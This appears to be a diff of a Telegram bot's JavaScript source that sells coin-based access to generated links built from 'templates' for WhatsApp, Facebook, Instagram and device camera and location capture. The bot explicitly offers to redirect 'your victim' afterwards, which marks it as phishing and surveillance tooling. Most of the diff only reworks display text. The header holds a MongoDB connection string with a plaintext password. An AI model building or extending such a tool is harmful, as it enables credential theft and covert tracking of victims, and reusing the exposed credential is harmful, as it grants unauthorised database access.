@@ -12,7 +12,7 @@ const OWNER_IDS = [6703335929, 6041728084, 5136260272, 7089533955, 6125809347];
 const CHANNEL_ID1 = "@alphacodex369";
 const CHANNEL_ID2 = "@Termuxcodex";
 const GROUP_ID = "@code_x369"; 
-const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority"; // ⚠️ CHANGE PASSWORD
+const MONGO_URI = "mongodb+srv://darkgangdarks_db_user:aEEYR59YEVameS1y@cluster0.iyakwh0.mongodb.net/DEVICEX?retryWrites=true&w=majority"; 
 
 const START_IMG_URL = "https://graph.org/file/c3b658c9adaf0aba7153f-a22a3447d1410355a0.jpg";
 
@@ -77,11 +77,11 @@ function makeBorder(title, content) {
 function escapeHtml(text) {
     if (!text) return text;
     return text.toString()
-        .replace(/&/g, "&")
-        .replace(/</g, "<")
-        .replace(/>/g, ">")
-        .replace(/"/g, '"')
-        .replace(/'/g, "'");
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
 }
 
 async function resolveUser(msg, input) {
@@ -109,7 +109,7 @@ function getSubTimeLeft(user) {
     const diff = user.subscriptionExpiry - Date.now();
     const days = Math.floor(diff / (1000 * 60 * 60 * 24));
     const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-    return `${days} ᴅᴀʏs, ${hours} ʜᴏᴜʀs`;
+    return `${days} ${_fnt("DAYS")}, ${hours} ${_fnt("HOURS")}`;
 }
 
 async function checkMembership(chatId) {
@@ -120,12 +120,7 @@ async function checkMembership(chatId) {
             bot.getChatMember(CHANNEL_ID2, chatId).catch(() => null),
             bot.getChatMember(GROUP_ID, chatId).catch(() => null)
         ]);
-        
-        const isC1 = c1 && s.includes(c1.status);
-        const isC2 = c2 && s.includes(c2.status);
-        const isG1 = g1 && s.includes(g1.status);
-
-        return { allJoined: isC1 && isC2 && isG1 };
+        return { allJoined: (c1 && s.includes(c1.status)) && (c2 && s.includes(c2.status)) && (g1 && s.includes(g1.status)) };
     } catch (e) { return { allJoined: false }; }
 }
 
@@ -156,7 +151,7 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                         if (activeOffer && activeOffer.expiry > Date.now()) {
                             if (activeOffer.rewardType === 'coin') {
                                 referrer.coins += activeOffer.value;
-                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ᴜɴʟᴏᴄᴋᴇᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +${activeOffer.value} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ (sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ).`), {parse_mode:'HTML'});
+                                bot.sendMessage(referrer.chatId, makeBorder("OFFER UNLOCKED", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💰: +${activeOffer.value} ${_fnt("COINS ADDED (SPECIAL OFFER).")}`), {parse_mode:'HTML'});
                             } else {
                                 let multiplier = 0;
                                 let amtStr = activeOffer.value;
@@ -168,14 +163,14 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                                 
                                 let currentExp = referrer.subscriptionExpiry && referrer.subscriptionExpiry > Date.now() ? referrer.subscriptionExpiry.getTime() : Date.now();
                                 referrer.subscriptionExpiry = new Date(currentExp + (val * multiplier));
-                                bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ᴜɴʟᴏᴄᴋᴇᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: +${amtStr} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ (sᴘᴇᴄɪᴀʟ ᴏғғᴇʀ).`), {parse_mode:'HTML'});
+                                bot.sendMessage(referrer.chatId, makeBorder("OFFER UNLOCKED", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💎: +${amtStr} ${_fnt("SUBSCRIPTION ADDED (SPECIAL OFFER).")}`), {parse_mode:'HTML'});
                             }
                         } else {
                             referrer.freeUrlsLeft += 1;
-                            bot.sendMessage(referrer.chatId, makeBorder("🎉 ʀᴇғᴇʀʀᴀʟ sᴜᴄᴄᴇss", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💰: +1 ғʀᴇᴇ ʟɪɴᴋ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
+                            bot.sendMessage(referrer.chatId, makeBorder("REFERRAL SUCCESS", `✅: ${_fnt("2 NEW USERS JOINED VIA YOUR LINK!")}\n💰: +1 ${_fnt("FREE LINK ADDED TO YOUR ACCOUNT.")}`), {parse_mode:'HTML'});
                         }
                     } else {
-                        bot.sendMessage(referrer.chatId, makeBorder("📈 ʀᴇғᴇʀʀᴀʟ ᴛʀᴀᴄᴋ", `✅: 1 ɴᴇᴡ ᴜsᴇʀ ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n⚠️: ɪɴᴠɪᴛᴇ 1 ᴍᴏʀᴇ ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ʀᴇᴡᴀʀᴅ.`), {parse_mode:'HTML'});
+                        bot.sendMessage(referrer.chatId, makeBorder("REFERRAL TRACK", `✅: ${_fnt("1 NEW USER JOINED VIA YOUR LINK!")}\n⚠️: ${_fnt("INVITE 1 MORE TO GET YOUR REWARD.")}`), {parse_mode:'HTML'});
                     }
                     await referrer.save();
                 }
@@ -183,7 +178,7 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
         }
         
         if (user.isBanned) {
-            return bot.sendMessage(chatId, "<b>┏━━「 ʙᴀɴɴᴇᴅ 」━━┓</b>\n┃ <b>🚫: ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n<b>┗━━━━━━━━━━┛</b>", {parse_mode:'HTML'});
+            return bot.sendMessage(chatId, makeBorder("BANNED", `🚫: ${_fnt("YOU ARE BANNED FROM USING THIS BOT!")}`), {parse_mode:'HTML'});
         }
 
         const { allJoined } = await checkMembership(chatId);
@@ -236,9 +231,9 @@ async function showMainMenu(msg) {
         parse_mode: 'HTML',
         reply_markup: { 
             keyboard: [
-                [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }], 
-                [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
-                [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }, { text: "💰 ʙᴜʏ ᴄᴏɪɴ" }]
+                [{ text: "🔗 " + _fnt("CREATE NEW URL") }], 
+                [{ text: "👤 " + _fnt("MY INFO") }, { text: "👨‍💻 " + _fnt("DEVELOPER") }],
+                [{ text: "🤝 " + _fnt("SHARE & EARN") }, { text: "💰 " + _fnt("BUY COIN") }]
             ], 
             resize_keyboard: true 
         }
@@ -247,7 +242,7 @@ async function showMainMenu(msg) {
     await bot.sendMessage(chatId, `💬 <b>${_fnt("NEED HELP OR SUPPORT?")}</b>`, {
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
+            inline_keyboard: [[{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
         }
     });
 }
@@ -272,10 +267,10 @@ async function showVerificationMenu(msg) {
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
-                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟷", url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
-                [{ text: "📢 ᴄʜᴀɴɴᴇʟ 𝟸", url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
-                [{ text: "👥 ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
-                [{ text: "✅ ᴠᴇʀɪғʏ", callback_data: "verify_join" }]
+                [{ text: "📢 " + _fnt("CHANNEL 1"), url: `https://t.me/${CHANNEL_ID1.replace('@', '')}` }],
+                [{ text: "📢 " + _fnt("CHANNEL 2"), url: `https://t.me/${CHANNEL_ID2.replace('@', '')}` }],
+                [{ text: "👥 " + _fnt("GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }],
+                [{ text: "✅ " + _fnt("VERIFY"), callback_data: "verify_join" }]
             ]
         }
     });
@@ -295,7 +290,7 @@ bot.on('message', async (msg) => {
                     parse_mode: 'HTML',
                     reply_to_message_id: msg.message_id,
                     reply_markup: {
-                        inline_keyboard: [[{ text: "🤖 ɢᴏ ᴛᴏ ʙᴏᴛ ᴅᴍ", url: `https://t.me/${botUsername}?start=${safeCmd}` }]]
+                        inline_keyboard: [[{ text: "🤖 " + _fnt("GO TO BOT DM"), url: `https://t.me/${botUsername}?start=${safeCmd}` }]]
                     }
                 });
             }
@@ -305,7 +300,7 @@ bot.on('message', async (msg) => {
 
     if (!text && !msg.caption && !msg.photo && !msg.video && !msg.document) return;
 
-    const ignorePrefixes = ['/start', '/gift', '/sudo', '/share', '/add', '/rem', '/rm', '/reset', '/ban', '/unban', '/ulist', '/ulink', '/rmlink', '/menu', '/data', '/users', '/ref', '/offer'];
+    const ignorePrefixes = ['/start', '/gift', '/sudo', '/share', '/add', '/rem', '/rm', '/reset', '/ban', '/unban', '/ulist', '/ulink', '/rmlink', '/menu', '/data', '/users', '/ref', '/offer', '/broadcast'];
     if (text && ignorePrefixes.some(prefix => text.startsWith(prefix))) return;
 
     if ((msg.caption && msg.caption.startsWith('/broadcast')) || (text && text.startsWith('/broadcast'))) return handleBroadcast(msg);
@@ -322,47 +317,47 @@ bot.on('message', async (msg) => {
         }
     }
 
-    if (text === "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" || text === "/create") {
+    if (text === "🔗 " + _fnt("CREATE NEW URL") || text === "/create") {
         handleCreateUrl(chatId, user);
     } 
-    else if (text === "👤 ᴍʏ ɪɴғᴏ" || text === "/info") {
+    else if (text === "👤 " + _fnt("MY INFO") || text === "/info") {
         handleInfo(chatId, user);
     }
-    else if (text === "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" || text === "/dev") {
+    else if (text === "👨‍💻 " + _fnt("DEVELOPER") || text === "/dev") {
         handleDev(chatId);
     }
-    else if (text === "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" || text === "/referral") {
+    else if (text === "🤝 " + _fnt("SHARE & EARN") || text === "/referral") {
         handleShare(chatId, user);
     }
     else if (text === "/help") {
         handleHelp(chatId);
     }
-    else if (text === "💰 ʙᴜʏ ᴄᴏɪɴ" || text === "/buy") {
+    else if (text === "💰 " + _fnt("BUY COIN") || text === "/buy") {
         handleBuyCoin(chatId);
     }
     else if (userState[chatId]) {
         if (userState[chatId].step === 'await_custom_name') {
             const cleanName = text.trim().replace(/[^a-zA-Z0-9-_]/g, '');
-            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("NAME TOO SHORT")}`), {parse_mode:'HTML'});
+            if(cleanName.length < 3) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("NAME IS TOO SHORT!")}`), {parse_mode:'HTML'});
             const exists = await Link.findOne({ shortId: cleanName });
-            if(exists) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("NAME TAKEN!")}`), {parse_mode:'HTML'});
+            if(exists) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("THIS NAME IS ALREADY TAKEN!")}`), {parse_mode:'HTML'});
             
             userState[chatId].name = cleanName;
             askRedirect(msg, cleanName);
         } else if (userState[chatId].step === 'await_redirect_url') {
-            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("URL MUST START WITH HTTP")}`), {parse_mode:'HTML'});
+            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("URL MUST START WITH HTTP OR HTTPS")}`), {parse_mode:'HTML'});
             createFinalLink(msg, userState[chatId].name, text.trim());
         }
     }
 });
 
-// --- [STEP 1] ৪টি টেমপ্লেট বাটন ---
+// --- [STEP 1] ৪টি টেমপ্লেট টার্গেট বাটন ---
 async function handleCreateUrl(chatId, user) {
     const isSub = hasActiveSub(user);
     if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
-        return bot.sendMessage(chatId, makeBorder("⚠️ ɴᴏ ᴄᴏɪɴs", `<b>🚫: ${_fnt("FREE TRIAL ENDED")}\n💰: ${_fnt("BUY COINS TO CONTINUE")}</b>`), {
+        return bot.sendMessage(chatId, makeBorder("NO COINS", `<b>🚫: ${_fnt("FREE TRIAL ENDED")}\n💰: ${_fnt("BUY COINS TO CONTINUE")}</b>`), {
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: "💰 ʙᴜʏ ᴄᴏɪɴs", url: `https://t.me/d1d4xx?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]] }
+            reply_markup: { inline_keyboard: [[{ text: "💰 " + _fnt("BUY COINS"), url: `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A` }]] }
         });
     }
     
@@ -381,9 +376,9 @@ async function handleCreateUrl(chatId, user) {
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
-                [{ text: "📱 DEVICE (Cam & Loc)", callback_data: "tpl_Device" }],
-                [{ text: "💬 WhatsApp", callback_data: "tpl_WhatsApp" }, { text: "📘 Facebook", callback_data: "tpl_Facebook" }],
-                [{ text: "📸 Instagram", callback_data: "tpl_Instagram" }]
+                [{ text: "📱 " + _fnt("DEVICE (CAM & LOC)"), callback_data: "tpl_Device" }],
+                [{ text: "💬 " + _fnt("WHATSAPP"), callback_data: "tpl_WhatsApp" }, { text: "📘 " + _fnt("FACEBOOK"), callback_data: "tpl_Facebook" }],
+                [{ text: "📸 " + _fnt("INSTAGRAM"), callback_data: "tpl_Instagram" }]
             ]
         }
     });
@@ -392,30 +387,30 @@ async function handleCreateUrl(chatId, user) {
 function handleBuyCoin(chatId) {
     const buyText = `<b>┏━━「 ${_fnt("DASHBOARD")} 」━━┓
 ┃ ┏─「 ${_fnt("BUY COIN")} 」
-┃ ┃  1. ₹30 = 60 ᴄᴏɪɴ
-┃ ┃  2. ₹50 = 105 ᴄᴏɪɴ
-┃ ┃  3. ₹100 = 210 ᴄᴏɪɴ
-┃ ┃  4. ₹200 = 330 ᴄᴏɪɴ
-┃ ┃  5. ₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ
-┃ ┃  6. ₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ
-┃ ┃  7. ₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ
+┃ ┃  1. ₹30 = 60 ${_fnt("COINS")}
+┃ ┃  2. ₹50 = 105 ${_fnt("COINS")}
+┃ ┃  3. ₹100 = 210 ${_fnt("COINS")}
+┃ ┃  4. ₹200 = 330 ${_fnt("COINS")}
+┃ ┃  5. ₹300 = 2 ${_fnt("MONTHS FREE")}
+┃ ┃  6. ₹500 = 5 ${_fnt("MONTHS FREE")}
+┃ ┃  7. ₹1000 = 1 ${_fnt("YEAR FREE")}
 ┃ ┗───────────╼
 ┗━━━━━━━━━━━━━┛</b>`;
 
-    const baseUrl = `https://t.me/d1d4x?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A`;
+    const baseUrl = `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A`;
 
     bot.sendMessage(chatId, buyText, {
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
-                [{ text: "₹30 = 60 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹30 = 60 ᴄᴏɪɴ") }],
-                [{ text: "₹50 = 105 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹50 = 105 ᴄᴏɪɴ") }],
-                [{ text: "₹100 = 210 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹100 = 210 ᴄᴏɪɴ") }],
-                [{ text: "₹200 = 330 ᴄᴏɪɴ", url: baseUrl + encodeURIComponent("Package ₹200 = 330 ᴄᴏɪɴ") }],
-                [{ text: "₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹300 = 2 ᴍᴏɴᴛʜ ғʀᴇᴇ") }],
-                [{ text: "₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹500 = 5 ᴍᴏɴᴛʜ ғʀᴇᴇ") }],
-                [{ text: "₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ", url: baseUrl + encodeURIComponent("Package ₹1000 = 1 ʏᴇᴀʀ ғʀᴇᴇ") }],
-                [{ text: "💳 ${_fnt("OTHER")}", url: baseUrl + encodeURIComponent("Other Package") }]
+                [{ text: "₹30 = 60 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹30 = 60 COINS") }],
+                [{ text: "₹50 = 105 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹50 = 105 COINS") }],
+                [{ text: "₹100 = 210 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹100 = 210 COINS") }],
+                [{ text: "₹200 = 330 " + _fnt("COINS"), url: baseUrl + encodeURIComponent("Package ₹200 = 330 COINS") }],
+                [{ text: "₹300 = 2 " + _fnt("MONTHS FREE"), url: baseUrl + encodeURIComponent("Package ₹300 = 2 MONTHS FREE") }],
+                [{ text: "₹500 = 5 " + _fnt("MONTHS FREE"), url: baseUrl + encodeURIComponent("Package ₹500 = 5 MONTHS FREE") }],
+                [{ text: "₹1000 = 1 " + _fnt("YEAR FREE"), url: baseUrl + encodeURIComponent("Package ₹1000 = 1 YEAR FREE") }],
+                [{ text: "💳 " + _fnt("OTHER"), url: baseUrl + encodeURIComponent("Other Package") }]
             ]
         }
     });
@@ -450,17 +445,17 @@ ${subData}<b>┃ ┃ 🛡 ${_fnt("BAN")}: ${user.isBanned ? "Yes" : "No"}</b>
         parse_mode: 'HTML',
         reply_markup: {
             inline_keyboard: [
-                [{ text: `📢 ${_fnt("ʙᴜʏ ᴄᴏɪɴ")}`, url: `https://t.me/d1d4x?text=**ɪ%20ᴡᴀɴᴛ%20ᴛᴏ%20ʙᴜʏ%20ᴄᴏɪɴ**%0A` }]
+                [{ text: "📢 " + _fnt("BUY COIN"), url: `https://t.me/d1d4x?text=**I%20WANT%20TO%20BUY%20COIN**%0A` }]
             ]
         }
     });
 }
 
 function handleDev(chatId) {
-    bot.sendMessage(chatId, makeBorder("ᴅᴇᴠᴇʟᴏᴘᴇʀ", `👨‍💻: ${_fnt("CODED BY DX-CODEX")}\n🛡: ${_fnt("POWERED BY CODEX-TEAM")}`), { 
+    bot.sendMessage(chatId, makeBorder("DEVELOPER", `👨‍💻: ${_fnt("CODED BY DX-CODEX")}\n🛡: ${_fnt("POWERED BY CODEX-TEAM")}`), { 
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [[{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
+            inline_keyboard: [[{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]]
         }
     });
 }
@@ -478,7 +473,7 @@ function handleShare(chatId, user) {
     const inviteUrl = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${chatId}&text=🔥%20Join%20this%20awesome%20bot%20and%20create%20custom%20links!`;
     bot.sendMessage(chatId, shareText, {
         parse_mode: 'HTML',
-        reply_markup: { inline_keyboard: [[{ text: "📲 sʜᴀʀᴇ ɴᴏᴡ", url: inviteUrl }]] }
+        reply_markup: { inline_keyboard: [[{ text: "📲 " + _fnt("SHARE NOW"), url: inviteUrl }]] }
     });
 }
 
@@ -507,7 +502,7 @@ function askRedirect(msg, name) {
     
     bot.sendMessage(chatId, `<b>┏━━「 ${_fnt("OPTION")} 」━━┓</b>\n┃ 📝: <b>${_fnt("NAME")}:</b> <code>${name}</code>\n┃ ❓: <b>${_fnt("DO YOU WANT TO REDIRECT")}\n┃ ${_fnt("YOUR VICTIM TO ANOTHER URL?")}</b>\n<b>┗━━━━━━━━━━┛</b>`, {
         parse_mode: 'HTML',
-        reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
+        reply_markup: { inline_keyboard: [[{ text: "✅ " + _fnt("YES"), callback_data: "use_redirect" }, { text: "❌ " + _fnt("NO"), callback_data: "no_redirect" }]] }
     });
 }
 
@@ -520,7 +515,7 @@ async function createFinalLink(msg, name, redirectUrl) {
     
     if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
         delete userState[chatId];
-        return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("NO COINS OR TRIALS LEFT!")}`), { parse_mode:'HTML' });
+        return bot.sendMessage(chatId, makeBorder("ERROR", `❌: ${_fnt("NO COINS OR TRIALS LEFT!")}`), { parse_mode:'HTML' });
     }
 
     if (!isSub) {
@@ -533,7 +528,7 @@ async function createFinalLink(msg, name, redirectUrl) {
     
     const hostUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
     const url = `${hostUrl}/w/${name}`;
-    let bal = isSub ? `sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴄᴛɪᴠᴇ` : `ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins} ᴄᴏɪɴs, ${user.freeUrlsLeft} ғʀᴇᴇ`;
+    let bal = isSub ? _fnt("SUBSCRIPTION ACTIVE") : `${_fnt("REMAINING")}: ${user.coins} ${_fnt("COINS")}, ${user.freeUrlsLeft} ${_fnt("FREE")}`;
     
     bot.sendMessage(chatId, `<b>┏━━「 ✅ ${_fnt("SUCCESS")} 」━━┓</b>\n┃ 🎯: <b>${_fnt("TEMPLATE")}:</b> ${selectedTpl}\n┃ 🔗: ${url}\n┃ \n┃ 🔄: ${redirectUrl || 'N/A'}\n┃ 💰: ${bal}\n<b>┗━━━━━━━━━━┛</b>`, { parse_mode: 'HTML' });
 }
@@ -577,8 +572,8 @@ bot.on('callback_query', async (query) => {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
-                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ", callback_data: "create_custom" }],
-                            [{ text: "🛠 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
+                            [{ text: "🔗 " + _fnt("CREATE NEW URL"), callback_data: "create_custom" }],
+                            [{ text: "🛠 " + _fnt("SUPPORT GROUP"), url: `https://t.me/${GROUP_ID.replace('@', '')}` }]
                         ]
                     }
                 });
@@ -587,9 +582,9 @@ bot.on('callback_query', async (query) => {
                     parse_mode: 'HTML',
                     reply_markup: {
                         keyboard: [
-                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }],
-                            [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
-                            [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }, { text: "💰 ʙᴜʏ ᴄᴏɪɴ" }]
+                            [{ text: "🔗 " + _fnt("CREATE NEW URL") }],
+                            [{ text: "👤 " + _fnt("MY INFO") }, { text: "👨‍💻 " + _fnt("DEVELOPER") }],
+                            [{ text: "🤝 " + _fnt("SHARE & EARN") }, { text: "💰 " + _fnt("BUY COIN") }]
                         ],
                         resize_keyboard: true
                     }
@@ -617,9 +612,9 @@ bot.on('callback_query', async (query) => {
         userState[chatId] = { template: tplName };
         await bot.answerCallbackQuery(query.id, { text: `${tplName} Selected!` });
         
-        bot.sendMessage(chatId, makeBorder("STEP 2", `🎯 Target: <b>${tplName}</b>\n\n🏷 <b>${_fnt("CHOOSE URL NAMING METHOD")}:</b>`), {
+        bot.sendMessage(chatId, makeBorder("STEP 2", `🎯 ${_fnt("TARGET")}: <b>${tplName}</b>\n\n🏷 <b>${_fnt("CHOOSE URL NAMING METHOD")}:</b>`), {
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: "✏️ ᴄᴜsᴛᴏᴍ ɴᴀᴍᴇ", callback_data: "create_custom" }, { text: "🎲 ʀᴀɴᴅᴏᴍ ɴᴀᴍᴇ", callback_data: "create_random" }]] }
+            reply_markup: { inline_keyboard: [[{ text: "✏️ " + _fnt("CUSTOM NAME"), callback_data: "create_custom" }, { text: "🎲 " + _fnt("RANDOM NAME"), callback_data: "create_random" }]] }
         });
         return;
     }
@@ -659,12 +654,12 @@ bot.onText(/\/gift\s+(\d+)\s+(.+)/, async (msg, match) => {
     
     const sender = await User.findOne({ chatId: msg.from.id });
     if (!sender || sender.coins < amount) {
-        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("INSUFFICIENT COINS")}`), {parse_mode:'HTML'});
+        return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("INSUFFICIENT COINS")}`), {parse_mode:'HTML'});
     }
     if (amount <= 0) return bot.sendMessage(msg.chat.id, "❌ Invalid Amount");
 
     const targetUser = await resolveUser(msg, inputTarget);
-    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("USER NOT FOUND IN DATABASE")}`), {parse_mode:'HTML'});
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND IN DATABASE")}`), {parse_mode:'HTML'});
 
     sender.coins -= amount;
     targetUser.coins += amount;
@@ -672,13 +667,13 @@ bot.onText(/\/gift\s+(\d+)\s+(.+)/, async (msg, match) => {
     await sender.save();
     await targetUser.save();
 
-    bot.sendMessage(msg.chat.id, makeBorder("🎁 ɢɪғᴛ sᴇɴᴛ", `✅: ${_fnt("YOU SENT")} ${amount} ${_fnt("COINS TO")} ${targetUser.firstName}`), {parse_mode:'HTML'});
-    bot.sendMessage(targetUser.chatId, makeBorder("🎁 ɢɪғᴛ ʀᴇᴄᴇɪᴠᴇᴅ", `🎉: ${_fnt("YOU RECEIVED")} ${amount} ${_fnt("COINS FROM")} ${sender.firstName}`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("GIFT SENT", `✅: ${_fnt("YOU SENT")} ${amount} ${_fnt("COINS TO")} ${targetUser.firstName}`), {parse_mode:'HTML'});
+    bot.sendMessage(targetUser.chatId, makeBorder("GIFT RECEIVED", `🎉: ${_fnt("YOU RECEIVED")} ${amount} ${_fnt("COINS FROM")} ${sender.firstName}`), {parse_mode:'HTML'});
 });
 
 bot.onText(/\/gift$/, (msg) => {
     if (msg.chat.type !== 'private') return;
-    bot.sendMessage(msg.chat.id, makeBorder("💡 ʜᴏᴡ ᴛᴏ ᴜsᴇ", `✍️ <b>${_fnt("USAGE")}:</b>\n<code>/gift [amount] [userID/Username]</code>\n\nExample: <code>/gift 10 123456789</code>`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("HOW TO USE", `✍️ <b>${_fnt("USAGE")}:</b>\n<code>/gift [amount] [userID/Username]</code>\n\nExample: <code>/gift 10 123456789</code>`), {parse_mode:'HTML'});
 });
 
 bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
@@ -738,7 +733,7 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
     }
 
     if (!targetId || isNaN(targetId)) {
-        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
+        return bot.sendMessage(msg.chat.id, makeBorder("ERROR", `❌: ${_fnt("USER NOT FOUND")}`), {parse_mode:'HTML'});
     }
     
     let targetUser = await User.findOne({ chatId: targetId });
@@ -749,14 +744,14 @@ bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
     }
     await targetUser.save();
     
-    bot.sendMessage(msg.chat.id, makeBorder("👑 sᴜᴅᴏ ᴜᴘᴅᴀᴛᴇ", `✅: ${targetUser.firstName || targetId} ${_fnt("SUDO ACCESS IS NOW")}: <b>${targetUser.isSudo}</b>`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("SUDO UPDATE", `✅: ${targetUser.firstName || targetId} ${_fnt("SUDO ACCESS IS NOW")}: <b>${targetUser.isSudo}</b>`), {parse_mode:'HTML'});
 });
 
